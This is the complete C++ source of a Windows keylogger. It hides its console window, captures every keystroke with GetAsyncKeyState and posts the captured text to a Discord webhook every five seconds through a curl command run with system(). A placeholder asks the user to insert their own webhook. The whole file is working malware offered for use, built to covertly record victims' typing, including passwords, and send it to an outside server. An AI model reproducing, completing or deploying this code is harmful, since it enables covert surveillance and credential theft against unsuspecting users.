#define _WIN32_WINNT 0x0500
#include <Windows.h>
#include <string>
#include <iostream>

using namespace std;

bool SpecialKeys(int S_Key) {
	switch (S_Key) {
	case VK_SPACE:
		cout << " ";
		return true;
	case VK_RETURN:
		cout << "\n";
		return true;
	case 190: // ASCII code for '.' on US keyboard
	cout << ".";
	return true;
	case VK_SHIFT:
		cout << "#SHIFT#";
		return true;
	case VK_BACK:
		cout << "\b";
		return true;
	case VK_RBUTTON:
		cout << "#R_CLICK#";
		return true;
	case VK_CAPITAL:
		cout << "#CAPS_LOCK#";
		return true;
	case VK_TAB:
		cout << "#TAB";
		return true;
	case VK_UP:
		cout << "#UP";
		return true;
	case VK_DOWN:
		cout << "#DOWN";
		return true;
	case VK_LEFT:
		cout << "#LEFT";
		return true;
	case VK_RIGHT:
		cout << "#RIGHT";
		return true;
	case VK_CONTROL:
		cout << "#CONTROL";
		return true;
	case VK_MENU:
		cout << "#ALT";
		return true;
	default: 
		return false;
	}
}
void sendToDiscord(const std::string& message) {
	//||||||||||||||||||||||||||||||||
	//ADD YOUR DISCORD WEBHOOK HERE|||
    std::string webhookUrl = "";//||||
	//||||||||||||||||||||||||||||||||
	//||||||||||||||||||||||||||||||||


    std::string command = "curl -H \"Content-Type: application/json\" -X POST -d \"{\\\"content\\\": \\\"" + message + "\\\"}\" \"" + webhookUrl + "\"";
    system(command.c_str());
}

int main()
{
	ShowWindow(GetConsoleWindow(), SW_HIDE); // Optional: hide console window
    string buffer;

auto lastSent = GetTickCount();
	while (true) {
    for (int KEY = 8; KEY <= 190; KEY++) {
        if (GetAsyncKeyState(KEY) & 1) {
            if (!SpecialKeys(KEY)) {
                buffer += char(KEY); // still naive, replace later with ToAscii logic
            }
        }
    }

    if (GetTickCount() - lastSent > 5000 && !buffer.empty()) { // every 5s
        sendToDiscord(buffer);
        buffer.clear();
        lastSent = GetTickCount();
    }

    Sleep(1);
}
	return 0;
}